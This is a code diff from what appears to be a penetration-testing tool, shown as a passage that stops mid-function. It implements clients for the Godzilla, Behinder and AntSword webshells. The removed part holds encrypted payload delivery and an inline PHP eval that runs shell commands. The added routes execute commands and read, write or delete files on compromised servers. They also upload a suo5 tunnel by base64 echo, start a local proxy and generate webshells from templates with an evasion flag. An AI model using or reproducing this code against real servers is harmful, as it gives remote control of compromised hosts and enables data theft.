-      const classPath = join(process.cwd(), 'assets', 'payloads', 'java', 'payload.classs')
-      const pmsJsp: Record<string, string> = { methodName: 'execCommand' }
-      if (isRawJsp) {
-        // RAW：body 原始字节
-        const args = command.split(/\s+/).filter((s) => s.length > 0)
-        pmsJsp.argsCount = String(args.length)
-        args.forEach((a, i) => (pmsJsp[`arg-${i}`] = a))
-        if (existsSync(classPath)) {
-          const encHand = godzillaJspEncodeRaw(readFileSync(classPath), connKey2)
-          await this.wsRequest(w, 'POST', w.url, encHand, 'application/octet-stream')
-        }
-        const enc2 = godzillaJspEncodeRaw(godzillaSerializeGzip(pmsJsp), connKey2)
-        const r2 = await this.wsRequest(w, 'POST', w.url, enc2, 'application/octet-stream')
-        const dec2 = godzillaJspDecodeRaw(r2.body, connKey2)
-        return dec2.toString(w.encoding || 'utf8').trim()
-      }
-      // BASE64：pass=base64(AES(...))，响应 md5(pass+xc)前16 + base64(AES(输出)) + md5后16
-      const argsB = command.split(/\s+/).filter((s) => s.length > 0)
-      const pmsB: Record<string, string> = { methodName: 'execCommand', argsCount: String(argsB.length) }
-      argsB.forEach((a, i) => (pmsB[`arg-${i}`] = a))
-      if (existsSync(classPath)) {
-        const encHand = godzillaJspEncode(readFileSync(classPath), connKey2)
-        await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(encHand)}`, 'application/x-www-form-urlencoded')
-      }
-      const enc2b = godzillaJspEncode(godzillaSerializeGzip(pmsB), connKey2)
-      const r2b = await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(enc2b)}`, 'application/x-www-form-urlencoded')
-      const dec2b = godzillaJspDecode(r2b.body.toString('utf8'), connKey2, pass)
-      return dec2b.toString(w.encoding || 'utf8').trim()
-    }
-    // 哥斯拉 ASPX：RijndaelManaged CBC 原版协议（BinaryRead 原始字节），连接密钥 = md5(用户 key) 前16
-    if (w.type === 'godzilla' && (w.script === 'aspx' || w.script === 'asp')) {
-      const connKey = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
-      const dllPath = join(process.cwd(), 'assets', 'payloads', 'csharp', 'payload.dll')
-      if (existsSync(dllPath)) {
-        const dll = readFileSync(dllPath)
-        const encHand = godzillaCshapEncodeRaw(dll, connKey)
-        await this.wsRequest(w, 'POST', w.url, encHand, 'application/octet-stream')
-      }
-      const tok = command.split(/\s+/).filter((s) => s.length > 0)
-      const exe = tok[0] || 'id'
-      const exeArgs = tok.slice(1).join(' ')
-      const pms: Record<string, string> = { methodName: 'execCommand', executableFile: exe, executableArgs: exeArgs }
-      // 参数体 = gzip(serialize)（C# formatParameter 用 GZipStream 解压），RijndaelManaged CBC(key,IV=key) 原始字节
-      const enc2 = godzillaCshapEncodeRaw(godzillaSerializeGzip(pms), connKey)
-      const r2 = await this.wsRequest(w, 'POST', w.url, enc2, 'application/octet-stream')
-      const dec2 = godzillaCshapDecodeRaw(r2.body, connKey)
-      return dec2.toString(w.encoding || 'utf8').trim()
-    }
-
-    // ---- 冰蝎：AES-128-CBC（默认）/ XOR ----
-    if (w.type === 'behinder') {
-      const pass = w.password || 'rebeyond'
-      const cryption = w.cryption || 'aes'
-      // JSP：下发自包含 payload class（HermesCmd.class，反射从 ?cmd= 读命令），服务端 defineClass→newInstance→equals(pageContext)
-      if (w.script === 'jsp' || w.script === 'jspx') {
-        const classPath = join(process.cwd(), 'assets', 'payloads', 'behinder', 'java', 'HermesCmd.class')
-        if (!existsSync(classPath)) throw new Error('冰蝎 JSP payload 缺失: HermesCmd.class')
-        const classBytes = readFileSync(classPath)
-        const enc = behinderAesEncode(classBytes, pass)
-        const sep = w.url.includes('?') ? '&' : '?'
-        const r = await this.wsRequest(w, 'POST', w.url + sep + 'cmd=' + encodeURIComponent(command), enc, 'application/octet-stream')
-        return r.body.toString(w.encoding || 'utf8').trim()
-      }
-      // ASPX：下发 U.dll（RijndaelManaged CBC key/IV=md5密码前16），服务端 Assembly.Load→CreateInstance("U")→Equals(page)
-      if (w.script === 'aspx') {
-        const dllPath = join(process.cwd(), 'assets', 'payloads', 'behinder', 'csharp', 'U.dll')
-        if (!existsSync(dllPath)) throw new Error('冰蝎 ASPX payload 缺失: U.dll')
-        const dll = readFileSync(dllPath)
-        const md5h = crypto.createHash('md5').update(pass, 'utf8').digest('hex').slice(0, 16)
-        const cipher = crypto.createCipheriv('aes-128-cbc', Buffer.from(md5h, 'utf8'), Buffer.from(md5h, 'utf8'))
-        // ASPX 模板 Request.BinaryRead(ContentLength) 直接解密 body 字节（无 base64）
-        const raw = Buffer.concat([cipher.update(dll), cipher.final()])
-        const sep = w.url.includes('?') ? '&' : '?'
-        const r = await this.wsRequest(w, 'POST', w.url + sep + 'cmd=' + encodeURIComponent(command), raw, 'application/octet-stream')
-        return r.body.toString(w.encoding || 'utf8').trim()
-      }
-      // 冰蝎 v2 模板协议：body = base64(AES-ECB(md5(pass)前16, "func|eval代码"))，服务端直接 eval(params)
-      const cmdB64 = Buffer.from(command, 'utf8').toString('base64')
-      const evalCode = `$c=base64_decode("${cmdB64}");$o="";if(function_exists('shell_exec')){$o=shell_exec($c);}elseif(function_exists('exec')){exec($c,$r);$o=implode("\\n",$r);}elseif(function_exists('system')){ob_start();system($c);$o=ob_get_clean();}elseif(function_exists('passthru')){ob_start();passthru($c);$o=ob_get_clean();}echo $o;`
-      const params = Buffer.from('var_dump|' + evalCode, 'utf8')
-      let enc: string
-      if (cryption.includes('xor')) enc = behinderXorEncode(params, pass)
-      else enc = behinderAesEncode(params, pass)
-      const r = await this.wsRequest(w, 'POST', w.url, enc, 'application/octet-stream')
-      let dec: Buffer
-      if (cryption.includes('xor')) dec = behinderXorDecode(r.body.toString('utf8'), pass)
-      else dec = behinderAesDecode(r.body.toString('utf8'), pass)
-      // 模板直接 echo eval 结果（明文），若非明文则用解密结果
-      const out = r.body.toString(w.encoding || 'utf8').trim()
-      return out.length > 0 ? out : dec.toString(w.encoding || 'utf8').trim()
-    }
-
-    throw new Error(`未知 webshell 类型: ${w.type}`)
-  }
-
-  /** 存活校验：哥斯拉走原版 test 协议（握手 + methodName=test → payload.test() 返回 ok）；其他类型执行标识命令 */
-  private async wsAliveShell(w: { id: number; type: string; script: string; url: string; password: string; key: string; cryption?: string; payload?: string; encoding?: string; headers?: string; connTimeout?: number; readTimeout?: number }): Promise<{ alive: boolean; detail?: string; error?: string }> {
-    try {
-      if (w.type === 'godzilla') {
-        const key = w.key || '3c6e0b8a9c15224a'
-        const connKey = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
-        const pass = w.password || 'pass'
-        if (w.script === 'php') {
-          // 握手建立 session → test()
-          const payload = this.godzillaPhpPayload()
-          await this.wsRequest(w, 'POST', w.url, godzillaPhpEncodeRaw(payload, connKey), 'application/octet-stream')
-          const r = await this.wsRequest(w, 'POST', w.url, godzillaPhpEncodeRaw(godzillaSerializeParams({ methodName: 'test' }), connKey), 'application/octet-stream')
-          let raw = xorCrypt(r.body, connKey)
-          if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) { try { raw = zlib.gunzipSync(raw) } catch { /* */ } }
-          const s = raw.toString(w.encoding || 'utf8').trim()
-          return { alive: s.includes('ok'), detail: s.slice(0, 200) }
-        }
-        const classPath = join(process.cwd(), 'assets', 'payloads', 'java', 'payload.classs')
-        if (w.script === 'jsp' || w.script === 'jspx') {
-          const isRawJsp = (w.cryption || '').toLowerCase().includes('raw')
-          const hasClass = existsSync(classPath)
-          if (isRawJsp) {
-            if (hasClass) await this.wsRequest(w, 'POST', w.url, godzillaJspEncodeRaw(readFileSync(classPath), connKey), 'application/octet-stream')
-            const r = await this.wsRequest(w, 'POST', w.url, godzillaJspEncodeRaw(godzillaSerializeGzip({ methodName: 'test' }), connKey), 'application/octet-stream')
-            const s = godzillaJspDecodeRaw(r.body, connKey).toString(w.encoding || 'utf8').trim()
-            return { alive: s.includes('ok'), detail: s.slice(0, 200) }
-          }
-          if (hasClass) await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(readFileSync(classPath), connKey))}`, 'application/x-www-form-urlencoded')
-          const r = await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(godzillaSerializeGzip({ methodName: 'test' }), connKey))}`, 'application/x-www-form-urlencoded')
-          const s = godzillaJspDecode(r.body.toString('utf8'), connKey, pass).toString(w.encoding || 'utf8').trim()
-          return { alive: s.includes('ok'), detail: s.slice(0, 200) }
-        }
-        if (w.script === 'aspx' || w.script === 'asp') {
-          const dllPath = join(process.cwd(), 'assets', 'payloads', 'csharp', 'payload.dll')
-          if (existsSync(dllPath)) await this.wsRequest(w, 'POST', w.url, godzillaCshapEncodeRaw(readFileSync(dllPath), connKey), 'application/octet-stream')
-          const r = await this.wsRequest(w, 'POST', w.url, godzillaCshapEncodeRaw(godzillaSerializeGzip({ methodName: 'test' }), connKey), 'application/octet-stream')
-          const s = godzillaCshapDecodeRaw(r.body, connKey).toString(w.encoding || 'utf8').trim()
-          return { alive: s.includes('ok'), detail: s.slice(0, 200) }
-        }
-      }
-      // 其他类型（冰蝎/蚁剑/自定义）：执行标识命令验证非空响应
-      const out = await this.wsExecShell(w, 'echo pentbox_alive_check')
-      return { alive: out.includes('pentbox_alive_check'), detail: out.slice(0, 200) }
-    } catch (e) {
-      return { alive: false, error: (e as Error).message }
-    }
-  }
-
-  /** 文件操作（参考哥斯拉原版：调 payload 方法 getFile/readFileContent/uploadFile/deleteFile，而非 shell 命令，JSP/PHP/ASPX 均支持） */
-  private async wsFileOp(w: { url: string; type: string; script: string; password: string; key: string; cryption?: string; encoding?: string; headers?: string; readTimeout?: number }, pms: Record<string, string>): Promise<Buffer> {
-    const key = w.key || '3c6e0b8a9c15224a'
-    const pass = w.password || 'pass'
-    if (w.type === 'godzilla') {
-      const connKey = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
-      if (w.script === 'php') {
-        const payload = this.godzillaPhpPayload()
-        await this.wsRequest(w, 'POST', w.url, godzillaPhpEncodeRaw(payload, connKey), 'application/octet-stream')
-        const enc = godzillaPhpEncodeRaw(godzillaSerializeParams(pms), connKey)
-        const r = await this.wsRequest(w, 'POST', w.url, enc, 'application/octet-stream')
-        let raw = xorCrypt(r.body, connKey)
-        if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) { try { raw = zlib.gunzipSync(raw) } catch { /* */ } }
-        return raw
-      }
-      const isRaw = (w.cryption || '').toLowerCase().includes('raw')
-      const classPath = join(process.cwd(), 'assets', 'payloads', 'java', 'payload.classs')
-      const gz = godzillaSerializeGzip(pms)
-      if (w.script === 'jsp' || w.script === 'jspx') {
-        if (isRaw) {
-          if (existsSync(classPath)) await this.wsRequest(w, 'POST', w.url, godzillaJspEncodeRaw(readFileSync(classPath), connKey), 'application/octet-stream')
-          const r = await this.wsRequest(w, 'POST', w.url, godzillaJspEncodeRaw(gz, connKey), 'application/octet-stream')
-          return godzillaJspDecodeRaw(r.body, connKey)
-        }
-        if (existsSync(classPath)) await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(readFileSync(classPath), connKey))}`, 'application/x-www-form-urlencoded')
-        const r = await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(gz, connKey))}`, 'application/x-www-form-urlencoded')
-        return godzillaJspDecode(r.body.toString('utf8'), connKey, pass)
-      }
-      if (w.script === 'aspx' || w.script === 'asp') {
-        const dllPath = join(process.cwd(), 'assets', 'payloads', 'csharp', 'payload.dll')
-        if (existsSync(dllPath)) await this.wsRequest(w, 'POST', w.url, godzillaCshapEncodeRaw(readFileSync(dllPath), connKey), 'application/octet-stream')
-        const r = await this.wsRequest(w, 'POST', w.url, godzillaCshapEncodeRaw(gz, connKey), 'application/octet-stream')
-        return godzillaCshapDecodeRaw(r.body, connKey)
-      }
-    }
-    throw new Error('该类型暂不支持文件操作')
-  }
 
   /** WebSocket 单发（连接 → 发送 → 收一条 → 关闭，8s 超时） */
   private wsSendOnce(url: string, payload: string): Promise<string> {
@@ -1493,6 +1463,392 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
     })
   }
 
+  // ---------------- 路由领域：配置组（上游/下游/监听/项目管理/代理控制） ----------------
+  private async handleConfig(req: IncomingMessage, res: ServerResponse, url: URL): Promise<void> {
+    if (url.pathname === '/api/upstream' && req.method === 'PUT') {
+      const body = JSON.parse(await this.readBody(req)) as Upstream
+      if (!body?.type) throw new Error('missing type')
+      this.engine.setUpstream(body)
+      this.upstreamPersisted = true  // 用户显式配置 → 会话持久化（重启恢复）
+      this.json(res, 200, { ok: true, upstream: body })
+      return
+    }
+    if (url.pathname === '/api/downstream') {
+      if (req.method === 'PUT') {
+        const body = JSON.parse(await this.readBody(req)) as { host?: string; port?: number; protocol?: 'http' | 'socks5' }
+        const ds = body && body.host && body.port && Number(body.port) > 0
+          ? { host: String(body.host).trim(), port: Number(body.port), protocol: body.protocol === 'socks5' ? ('socks5' as const) : ('http' as const) }
+          : null
+        this.engine.setDownstream(ds)
+        this.queueSessionSave()  // 下游代理随项目快照合并异步持久化（切换项目时随之恢复）
+        this.json(res, 200, { ok: true, downstream: ds })
+      } else {
+        this.json(res, 200, { downstream: this.engine.getDownstream() })
+      }
+      return
+    }
+    if (url.pathname === '/api/listen') {
+      if (req.method === 'PUT') {
+        const body = JSON.parse(await this.readBody(req)) as { ip?: string; api?: number }
+        const ip = String(body?.ip ?? '').trim()
+        const options = ApiServer.listenOptions()
+        if (!(ip === '0.0.0.0' || ip === '127.0.0.1' || options.includes(ip))) throw new Error(`invalid listen ip: ${ip}`)
+        const api = body?.api ? Number(body.api) : this.opts.port ?? this.port
+        if (!Number.isInteger(api) || api < 1 || api > 65535) throw new Error(`端口 ${body?.api} 不在合理范围（1-65535）`)
+        if (api === 8899 || api === 8878) throw new Error(`端口 ${api} 与代理/终端默认端口冲突`)
+        if (api !== (this.opts.port ?? this.port) && await ApiServer.portInUse(api)) throw new Error(`端口 ${api} 已被占用`)
+        try { ApiServer.writeConfig({ ip, api }) } catch (e) { console.error('[pentbox] 监听配置落盘失败:', String(e).slice(0, 120)) }
+        this.json(res, 200, { ok: true, ip, api, restart: true })
+      } else {
+        this.json(res, 200, { ...ApiServer.loadListen(), options: ApiServer.listenOptions() })
+      }
+      return
+    }
+    if (url.pathname === '/api/session/info') {
+      this.json(res, 200, { path: this.currentProjectPath, savedAt: this.lastSavedAt, flows: this.flows.length, details: this.flowDetails.size, digest: this.analysisDigest.length, projects: this.listProjects() })
+      return
+    }
+    if (url.pathname === '/api/session/save' && req.method === 'POST') {
+      const b = JSON.parse(await this.readBody(req)) as { path?: string }
+      await this.saveSessionNow(b.path)  // 异步落盘；传 path=另存为（内部切换当前项目）
+      this.json(res, 200, { ok: true, path: this.currentProjectPath, savedAt: this.lastSavedAt })
+      return
+    }
+    if (url.pathname === '/api/session/open' && req.method === 'POST') {
+      const b = JSON.parse(await this.readBody(req)) as { path: string }
+      this.openProject(b.path)
+      this.json(res, 200, { ok: true, path: this.currentProjectPath, flows: this.flows.length, details: this.flowDetails.size })
+      return
+    }
+    if (url.pathname === '/api/session/new' && req.method === 'POST') {
+      const b = JSON.parse(await this.readBody(req)) as { name?: string }
+      this.resetProject()  // 自动保存当前项目 + 清空
+      if (b.name) {
+        // 按名新建：保存到项目目录（~/.pentbox/projects/<name>.hpbs）并绑定
+        const safe = String(b.name).trim().replace(/[\\/:*?"<>|]/g, '_').replace(/\.hpbs$/i, '')
+        if (!safe) throw new Error('项目名无效')
+        const p = join(this.projectsDir, `${safe}.hpbs`)
+        this.saveSession(p)
+        this.currentProjectPath = p
+        this.graph.setProject(safe)
+      }
+      this.json(res, 200, { ok: true, path: this.currentProjectPath })
+      return
+    }
+    if (url.pathname === '/api/proxy/stop' && req.method === 'POST') {
+      await this.engine.stop()
+      this.json(res, 200, { ok: true })
+      return
+    }
+    this.json(res, 404, { error: `no route: ${req.method} ${url.pathname}` })
+  }
+
+  // ---------------- 路由领域：WebShell 管理（CRUD/执行/生成/存活/suo5） ----------------
+  private async handleWebshells(req: IncomingMessage, res: ServerResponse, url: URL): Promise<void> {
+    switch (url.pathname) {
+        case "/api/webshells": {
+          if (req.method === "GET") {
+            this.json(res, 200, { items: this.webshells.map(({ password, key, ...meta }) => ({ ...meta, password: password ? "***" : "", key: key ? "***" : "" })) });
+          } else if (req.method === "POST") {
+            const b = JSON.parse(await this.readBody(req));
+            if (!b.url) throw new Error("url \u7F3A\u5931");
+            const w = { id: ++this.wsSeq, type: b.type || "custom", script: b.script || "php", url: b.url, password: b.password || "", key: b.key || "", status: "unknown", ts: Date.now(), cryption: b.cryption || "", payload: b.payload || "", encoding: b.encoding || "UTF-8", headers: b.headers || "", reqLeft: b.reqLeft || "", reqRight: b.reqRight || "", connTimeout: b.connTimeout || 3e3, readTimeout: b.readTimeout || 6e4, remark: b.remark || "" };
+            this.webshells.push(w);
+            this.saveWebshells();
+            this.graph.writeWebShell(w);
+            this.invalidateDigestCache();
+            this.broadcastGraphChange(`\u65B0 WebShell(${w.type}/${w.script}) ${w.url}`);
+            this.json(res, 200, { ok: true, id: w.id });
+          } else {
+            this.json(res, 405, { error: "method not allowed" });
+          }
+          break;
+        }
+        case "/api/webshells/detail": {
+          const id = Number(url.searchParams.get("id")) || 0;
+          const w = this.webshells.find((x) => x.id === id);
+          if (!w) {
+            this.json(res, 404, { error: "not found" });
+            break;
+          }
+          if (req.method === "GET") this.json(res, 200, w);
+          else if (req.method === "PUT") {
+            const b = JSON.parse(await this.readBody(req));
+            if (b.type !== void 0) w.type = b.type;
+            if (b.script !== void 0) w.script = b.script;
+            if (b.url !== void 0) w.url = b.url;
+            if (b.password !== void 0) w.password = b.password;
+            if (b.key !== void 0) w.key = b.key;
+            if (b.cryption !== void 0) w.cryption = b.cryption;
+            if (b.payload !== void 0) w.payload = b.payload;
+            if (b.encoding !== void 0) w.encoding = b.encoding;
+            if (b.headers !== void 0) w.headers = b.headers;
+            if (b.connTimeout !== void 0) w.connTimeout = b.connTimeout;
+            if (b.readTimeout !== void 0) w.readTimeout = b.readTimeout;
+            if (b.remark !== void 0) w.remark = b.remark;
+            if (b.reqLeft !== void 0) w.reqLeft = b.reqLeft;
+            if (b.reqRight !== void 0) w.reqRight = b.reqRight;
+            if (b.timeout !== void 0) w.connTimeout = b.timeout;
+            this.saveWebshells();
+            this.graph.writeWebShell(w);
+            this.invalidateDigestCache();
+            this.broadcastGraphChange(`WebShell \u66F4\u65B0(${w.type}/${w.script}) ${w.url}`);
+            this.json(res, 200, { ok: true });
+          } else if (req.method === "DELETE") {
+            const wd = this.webshells.find((x) => x.id === id);
+            this.webshells = this.webshells.filter((x) => x.id !== id);
+            this.saveWebshells();
+            if (wd) this.graph.deleteWebShell(wd.url);
+            this.json(res, 200, { ok: true });
+          } else {
+            this.json(res, 405, { error: "method not allowed" });
+          }
+          break;
+        }
+        case "/api/webshells/ping": {
+          const b = JSON.parse(await this.readBody(req));
+          const w = this.webshells.find((x) => x.id === b.id);
+          if (!w) throw new Error("webshell \u4E0D\u5B58\u5728");
+          try {
+            const r = await this.wsClient.request(w, "GET", w.url, void 0);
+            w.status = r.code >= 200 && r.code < 400 ? "alive" : "dead";
+            this.saveWebshells();
+            this.json(res, 200, { alive: w.status === "alive", code: r.code });
+          } catch (e) {
+            w.status = "dead";
+            this.saveWebshells();
+            this.json(res, 200, { alive: false, error: (e as Error).message });
+          }
+          break;
+        }
+        case "/api/webshells/alive": {
+          const b = JSON.parse(await this.readBody(req));
+          const w = this.webshells.find((x) => x.id === b.id);
+          if (!w) throw new Error("webshell \u4E0D\u5B58\u5728");
+          const r = await this.wsClient.aliveShell(w);
+          w.status = r.alive ? "alive" : "dead";
+          this.saveWebshells();
+          this.json(res, 200, { alive: r.alive, detail: r.detail || "", error: r.error || "" });
+          break;
+        }
+        case "/api/webshells/alive_all": {
+          const results = [];
+          for (const w of this.webshells) {
+            const r = await this.wsClient.aliveShell(w);
+            w.status = r.alive ? "alive" : "dead";
+            results.push({ id: w.id, url: w.url, type: w.type, script: w.script, alive: r.alive, detail: r.detail || "", error: r.error || "" });
+          }
+          this.saveWebshells();
+          this.json(res, 200, { results });
+          break;
+        }
+        case "/api/webshells/fileop": {
+          const b = JSON.parse(await this.readBody(req));
+          const w = this.webshells.find((x) => x.id === b.id);
+          if (!w) throw new Error("webshell \u4E0D\u5B58\u5728");
+          let pms;
+          if (b.action === "list") pms = { methodName: "getFile", dirName: b.dir || "/" };
+          else if (b.action === "delete") pms = { methodName: "deleteFile", fileName: b.file || "" };
+          else if (b.action === "read") pms = { methodName: w.script === "php" ? "readFileContent" : "readFile", fileName: b.file || "" };
+          else if (b.action === "write") pms = { methodName: "uploadFile", fileName: b.file || "", fileValue: Buffer.from(b.content || "", "base64") };
+          else throw new Error("\u672A\u77E5\u64CD\u4F5C");
+          const buf = await this.wsClient.fileOp(w, pms);
+          if (b.action === "read") this.json(res, 200, { output: buf.toString("base64") });
+          else this.json(res, 200, { output: buf.toString(w.encoding || "utf8") });
+          break;
+        }
+        case "/api/webshells/suo5": {
+          const b = JSON.parse(await this.readBody(req));
+          if (b.action === "status") {
+            this.json(res, 200, { running: !!this.suo5Proc, port: this.suo5Proc?.port || 0, url: this.suo5Proc?.url || "" });
+            break;
+          }
+          if (b.action === "stop") {
+            if (this.suo5Proc) {
+              try {
+                this.suo5Proc.proc.kill();
+              } catch {
+              }
+              this.suo5Proc = null;
+            }
+            this.json(res, 200, { ok: true });
+            break;
+          }
+          const w = this.webshells.find((x) => x.id === b.id);
+          if (!w) throw new Error("webshell \u4E0D\u5B58\u5728");
+          if (!b.url) throw new Error("\u76EE\u6807 URL \u7F3A\u5931");
+          const autoType = w.script === "jsp" || w.script === "jspx" ? "jsp" : w.script === "aspx" || w.script === "asp" ? "aspx" : "php";
+          const ext = b.type === "jsp" ? "jsp" : b.type === "aspx" ? "aspx" : (b.type || autoType) === "jsp" ? "jsp" : (b.type || autoType) === "aspx" ? "aspx" : "php";
+          const fn = (b.name || "suo5").replace(/[\\/]/g, "") + "." + ext;
+          const scriptPath = join(process.cwd(), "tools", "suo5", fn);
+          if (!existsSync(scriptPath)) throw new Error("\u670D\u52A1\u7AEF\u811A\u672C\u7F3A\u5931: " + scriptPath);
+          const script = readFileSync(scriptPath);
+          const dir = (b.dir || "/tmp").replace(/\/+$/, "");
+          const target = dir + "/" + fn;
+          if (w.type === "godzilla") {
+            await this.wsClient.fileOp(w, { methodName: "uploadFile", fileName: target, fileValue: script });
+          } else {
+            const b64 = script.toString("base64");
+            await this.wsClient.execShell(w, `echo ${b64} | base64 -d > ${JSON.stringify(target)}`);
+          }
+          const port = b.port || 1080;
+          const suo5Dir = join(process.cwd(), "tools", "suo5");
+          const suo5Bin = join(suo5Dir, "suo5.exe");
+          if (this.suo5Proc) {
+            try {
+              this.suo5Proc.proc.kill();
+            } catch {
+            }
+          }
+          this.suo5Proc = { proc: spawn(suo5Bin, ["-t", b.url, "-l", "127.0.0.1:" + port], { detached: true, cwd: suo5Dir, stdio: "ignore" }), port, url: b.url };
+          this.json(res, 200, { ok: true, path: target, port });
+          break;
+        }
+        case "/api/webshells/test": {
+          const b = JSON.parse(await this.readBody(req));
+          if (!b.url) throw new Error("url \u7F3A\u5931");
+          this.wsClient.clearCookies(b.url);
+          const w = {
+            id: 0,
+            type: (b.type || "custom").toLowerCase(),
+            script: (b.script || "php").toLowerCase(),
+            url: b.url,
+            password: b.password || "",
+            key: b.key || "",
+            cryption: b.cryption || "",
+            payload: b.payload || "",
+            encoding: b.encoding || "UTF-8",
+            headers: b.headers || "",
+            readTimeout: b.readTimeout || 6e4
+          };
+          const r = await this.wsClient.aliveShell(w);
+          this.json(res, 200, { alive: r.alive, detail: r.detail || "", error: r.error || "" });
+          break;
+        }
+        case "/api/webshells/exec": {
+          const b = JSON.parse(await this.readBody(req));
+          const w = this.webshells.find((x) => x.id === b.id);
+          if (!w) throw new Error("webshell \u4E0D\u5B58\u5728");
+          if (!b.command) throw new Error("command \u7F3A\u5931");
+          try {
+            const out = await this.wsClient.execShell(w, b.command);
+            this.json(res, 200, { ok: true, output: out });
+          } catch (e) {
+            this.json(res, 200, { ok: false, error: (e as Error).message });
+          }
+          break;
+        }
+        // ---------------- WebShell 生成（参考各工具原版：哥斯拉=Payload+加密；冰蝎=AES密钥模板；蚁剑=一句话；自定义=脚本） ----------------
+        case "/api/webshells/generate": {
+          const b = JSON.parse(await this.readBody(req)) as { type?: string; payload?: string; script?: string; cryption?: string; password?: string; key?: string; evasion?: boolean };
+          const type = (b.type || "godzilla").toLowerCase();
+          const pass = (b.password || "pass").trim();
+          const key = (b.key || "3c6e0b8a9c15224a").trim();
+          const payload = b.payload || "PhpDynamicPayload";
+          const script = (b.script || "php").toLowerCase();
+          const cryption = (b.cryption || "").toLowerCase();
+          const md5Key = crypto.createHash("md5").update(key, "utf8").digest("hex").slice(0, 16);
+          const md5Pass = crypto.createHash("md5").update(pass, "utf8").digest("hex").slice(0, 16);
+          const isRaw = cryption.includes("raw");
+          const isEval = cryption.includes("eval");
+          const readT = (dir: string, name: string) => {
+            const p = join(process.cwd(), "assets", "payloads", dir, name);
+            return existsSync(p) ? readFileSync(p, "utf8") : "";
+          };
+          const toUnicode = (s: string) => {
+            let out = "";
+            for (const ch of s) out += "\\u" + ch.charCodeAt(0).toString(16).padStart(4, "0");
+            return out;
+          };
+          let code = "";
+          let mode = "";
+          let outScript = script;
+          if (type === "godzilla") {
+            const metaOf = (p: string) => p === "PhpDynamicPayload" ? "php" : p === "JavaDynamicPayload" ? "jsp" : p === "CShapDynamicPayload" ? "aspx" : p === "AspDynamicPayload" ? "asp" : "";
+            outScript = metaOf(payload);
+            if (!outScript) throw new Error(`\u672A\u77E5 payload: ${payload}`);
+            if (outScript === "php") {
+              const tmplName = isRaw ? "raw.bin" : isEval ? "eval.bin" : "base64.bin";
+              let tmpl = readT("php", tmplName);
+              if (!tmpl) throw new Error("PHP \u6A21\u677F\u7F3A\u5931");
+              code = tmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key);
+              mode = isRaw ? "XOR RAW" : isEval ? "EVAL XOR BASE64" : "XOR BASE64";
+            } else if (outScript === "jsp") {
+              const gTmpl = readT("java", (isRaw ? "raw" : "base64") + "GlobalCode.bin");
+              const cTmpl = readT("java", (isRaw ? "raw" : "base64") + "Code.bin");
+              const shellTmpl = readT("java", "shell.jsp");
+              if (!gTmpl || !cTmpl || !shellTmpl) throw new Error("JSP \u6A21\u677F\u7F3A\u5931");
+              const globalCode = gTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key);
+              const codePart = cTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key);
+              code = shellTmpl.replace(/\{globalCode\}/g, globalCode).replace(/\{code\}/g, codePart);
+              mode = isRaw ? "JAVA AES RAW" : "JAVA AES BASE64";
+            } else if (outScript === "aspx") {
+              const cTmpl = isRaw ? readT("cshap", "raw.bin") : readT("cshap", "base64.bin");
+              const shellTmpl = readT("cshap", "shell.aspx");
+              if (!cTmpl || !shellTmpl) throw new Error("ASPX \u6A21\u677F\u7F3A\u5931");
+              const codePart = cTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key);
+              code = shellTmpl.replace(/\{code\}/g, codePart);
+              mode = isRaw ? "CSHAP AES RAW" : "CSHAP AES BASE64";
+            } else if (outScript === "asp") {
+              let tmpl = "";
+              if (isEval) tmpl = readT("asp", "AspEvalBase64.bin");
+              else if (isRaw) tmpl = readT("asp", "AspXorRaw.bin");
+              else tmpl = readT("asp", "AspXorBae64.bin");
+              if (!tmpl) throw new Error("ASP \u6A21\u677F\u7F3A\u5931");
+              code = tmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key);
+              mode = isRaw ? "ASP XOR RAW" : isEval ? "ASP EVAL BASE64" : "ASP XOR BASE64";
+            }
+          } else if (type === "behinder") {
+            outScript = script;
+            const isXor = cryption.includes("xor");
+            if (isXor && script !== "php") throw new Error("\u51B0\u874E XOR \u52A0\u5BC6\u4EC5\u652F\u6301 PHP");
+            const tmplMap = {
+              php: isXor ? "shell_xor.php" : "shell.php",
+              jsp: "shell_java9.jsp",
+              jspx: "shell_uni.jsp",
+              aspx: "shell.aspx",
+              asp: "shell.asp"
+            };
+            const fname = tmplMap[script as keyof typeof tmplMap];
+            if (!fname) throw new Error(`\u51B0\u874E\u6682\u4E0D\u652F\u6301\u811A\u672C ${script}`);
+            const tmpl = readT("behinder", fname);
+            if (!tmpl) throw new Error(`\u51B0\u874E\u6A21\u677F\u7F3A\u5931: ${fname}`);
+            code = tmpl.replace(/e45e329feb5d925b/g, md5Pass);
+            mode = isXor ? `XOR\uFF08\u5BC6\u94A5=md5(\u5BC6\u7801)\u524D16=${md5Pass}\uFF09` : `AES\uFF08\u5BC6\u94A5=md5(\u5BC6\u7801)\u524D16=${md5Pass}\uFF09`;
+          } else if (type === "antsword") {
+            outScript = script;
+            const tmplMap = {
+              php: "shell.php",
+              jsp: "shell.jsp",
+              aspx: "shell.aspx",
+              asp: "shell.asp"
+            };
+            const fname = tmplMap[script as keyof typeof tmplMap];
+            if (!fname) throw new Error(`\u8681\u5251\u6682\u4E0D\u652F\u6301\u811A\u672C ${script}`);
+            const tmpl = readT("antsword", fname);
+            if (!tmpl) throw new Error(`\u8681\u5251\u6A21\u677F\u7F3A\u5931: ${fname}`);
+            if (script === "php") {
